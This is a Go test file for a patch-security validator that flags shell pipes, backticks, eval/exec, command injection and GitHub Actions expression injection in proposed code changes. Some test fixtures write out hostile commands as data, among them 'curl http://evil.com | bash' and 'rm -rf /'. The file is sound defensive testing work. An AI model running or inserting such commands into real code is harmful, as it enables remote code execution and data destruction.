package security

import (
	"strings"
	"testing"
)

func TestValidatePatchLine(t *testing.T) {
	v := NewCodeValidator(true)

	tests := []struct {
		name       string
		line       string
		filename   string
		isAddition bool
		wantErr    bool
		errContains string
	}{
		// Shell control characters in code files
		{
			name:       "Shell pipe in Python",
			line:       "os.system('ls | grep test')",
			filename:   "script.py",
			isAddition: true,
			wantErr:    true,
			errContains: "pipe",
		},
		{
			name:       "Backtick in shell script",
			line:       "result=`whoami`",
			filename:   "deploy.sh",
			isAddition: true,
			wantErr:    true,
			errContains: "backtick",
		},
		{
			name:       "Command substitution in YAML",
			line:       "    run: echo $(date)",
			filename:   ".github/workflows/test.yml",
			isAddition: true,
			wantErr:    true,
			errContains: "dollar",
		},
		{
			name:       "Semicolon command separator",
			line:       "cmd1; cmd2",
			filename:   "Makefile",
			isAddition: true,
			wantErr:    true,
			errContains: "semicolon",
		},
		
		// Safe changes
		{
			name:       "Comment in Python",
			line:       "# This is a safe comment",
			filename:   "test.py",
			isAddition: true,
			wantErr:    false,
		},
		{
			name:       "Apostrophe in markdown",
			line:       "It's a nice day for coding",
			filename:   "README.md",
			isAddition: true,
			wantErr:    false,
		},
		{
			name:       "Regular code without control chars",
			line:       "const result = calculateSum(a, b)",
			filename:   "math.js",
			isAddition: true,
			wantErr:    false,
		},
		
		// Line length validation
		{
			name:       "Line too long in code",
			line:       strings.Repeat("a", 100),
			filename:   "test.go",
			isAddition: true,
			wantErr:    true,
			errContains: "exceeds maximum length",
		},
		{
			name:       "Acceptable line in markdown",
			line:       strings.Repeat("a", 90),
			filename:   "docs.md",
			isAddition: true,
			wantErr:    false,
		},
		
		// Dangerous patterns
		{
			name:       "eval in JavaScript",
			line:       "eval(userInput)",
			filename:   "app.js",
			isAddition: true,
			wantErr:    true,
			errContains: "dangerous command",
		},
		{
			name:       "exec in Python",
			line:       "exec(code_string)",
			filename:   "runner.py",
			isAddition: true,
			wantErr:    true,
			errContains: "dangerous command",
		},
		{
			name:       "GitHub Actions untrusted input",
			line:       "run: echo ${{ github.event.issue.title }}",
			filename:   ".github/workflows/ci.yml",
			isAddition: true,
			wantErr:    true,
			errContains: "untrusted GitHub Actions input",
		},
		
		// Removals should be allowed
		{
			name:       "Removing dangerous line",
			line:       "os.system('rm -rf /')",
			filename:   "danger.py",
			isAddition: false,
			wantErr:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidatePatchLine(tt.line, tt.filename, tt.isAddition, !tt.isAddition)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePatchLine() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errContains != "" {
				if !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("Error message doesn't contain expected string.\nGot: %v\nExpected to contain: %s", 
						err, tt.errContains)
				}
			}
		})
	}
}

func TestValidatePatch(t *testing.T) {
	v := NewCodeValidator(true)

	tests := []struct {
		name     string
		patch    string
		filename string
		wantErr  bool
	}{
		{
			name: "Safe markdown change",
			patch: `@@ -1,3 +1,3 @@
 # Documentation
-This is the old text
+This is the new text with an apostrophe: it's better!`,
			filename: "README.md",
			wantErr:  false,
		},
		{
			name: "Dangerous shell script change",
			patch: `@@ -1,3 +1,3 @@
 #!/bin/bash
-echo "Hello"
+curl http://evil.com | bash`,
			filename: "install.sh",
			wantErr:  true,
		},
		{
			name: "Adding command injection",
			patch: `@@ -1,3 +1,4 @@
 import os
 def process(user_input):
+    os.system(f"echo {user_input}")
     return user_input`,
			filename: "app.py",
			wantErr:  true,
		},
		{
			name: "Safe comment addition",
			patch: `@@ -1,3 +1,4 @@
 func main() {
+    // TODO: Add error handling
     fmt.Println("Hello")
 }`,
			filename: "main.go",
			wantErr:  false,
		},
		{
			name: "GitHub Actions with expression injection",
			patch: `@@ -1,3 +1,4 @@
 name: CI
 on: [push]
+    - run: echo ${{ github.event.pull_request.title }}`,
			filename: ".github/workflows/ci.yml",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidatePatch(tt.patch, tt.filename)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePatch() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestIsSafeChange(t *testing.T) {
	v := NewCodeValidator(true)

	tests := []struct {
		name     string
		patch    string
		filename string
		want     bool
	}{
		{
			name: "Comment-only change in code",
			patch: `@@ -1,3 +1,4 @@
 func main() {
+    // This is a new comment
     fmt.Println("Hello")
 }`,
			filename: "main.go",
			want:     true,
		},
		{
			name: "Code change",
			patch: `@@ -1,3 +1,3 @@
 func main() {
-    fmt.Println("Hello")
+    fmt.Println("World")
 }`,
			filename: "main.go",
			want:     false,
		},
		{
			name: "Markdown improvement",
			patch: `@@ -1,3 +1,3 @@
 # Title
-Its a test
+It's a test`,
			filename: "README.md",
			want:     true,
		},
		{
			name: "Config file change",
			patch: `@@ -1,3 +1,3 @@
 version: 2
-image: node:14
+image: node:16`,
			filename: "docker-compose.yml",
			want:     false,
		},
		{
			name: "Shell script any change",
			patch: `@@ -1,3 +1,3 @@
 echo "test"
+# Even comments in shell scripts are risky`,
			filename: "deploy.sh",
			want:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.IsSafeChange(tt.patch, tt.filename)
			if got != tt.want {
				t.Errorf("IsSafeChange() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestGetFileTypeConfig(t *testing.T) {
	tests := []struct {
		name             string
		filename         string
		wantIsCode       bool
		wantIsConfig     bool
		wantIsMarkdown   bool
		wantAllowApostrophes bool
	}{
		{
			name:             "Python file",
			filename:         "script.py",
			wantIsCode:       true,
			wantIsConfig:     false,
			wantIsMarkdown:   false,
			wantAllowApostrophes: false,
		},
		{
			name:             "YAML config",
			filename:         "config.yml",
			wantIsCode:       false,
			wantIsConfig:     true,
			wantIsMarkdown:   false,
			wantAllowApostrophes: false,
		},
		{
			name:             "Markdown file",
			filename:         "README.md",
			wantIsCode:       false,
			wantIsConfig:     false,
			wantIsMarkdown:   true,
			wantAllowApostrophes: true,
		},
		{
			name:             "GitHub workflow",
			filename:         ".github/workflows/test.yml",
			wantIsCode:       false,
			wantIsConfig:     true,
			wantIsMarkdown:   false,
			wantAllowApostrophes: false,
		},
		{
			name:             "Shell script",
			filename:         "deploy.sh",
			wantIsCode:       true,
			wantIsConfig:     false,
			wantIsMarkdown:   false,
			wantAllowApostrophes: false,
		},
		{
			name:             "Dockerfile",
			filename:         "Dockerfile",
			wantIsCode:       false,
			wantIsConfig:     true,
			wantIsMarkdown:   false,
			wantAllowApostrophes: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			config := GetFileTypeConfig(tt.filename)
			if config.IsCode != tt.wantIsCode {
				t.Errorf("IsCode = %v, want %v", config.IsCode, tt.wantIsCode)
			}
			if config.IsConfig != tt.wantIsConfig {
				t.Errorf("IsConfig = %v, want %v", config.IsConfig, tt.wantIsConfig)
			}
			if config.IsMarkdown != tt.wantIsMarkdown {
				t.Errorf("IsMarkdown = %v, want %v", config.IsMarkdown, tt.wantIsMarkdown)
			}
			if config.AllowApostrophes != tt.wantAllowApostrophes {
				t.Errorf("AllowApostrophes = %v, want %v", config.AllowApostrophes, tt.wantAllowApostrophes)
			}
		})
	}
}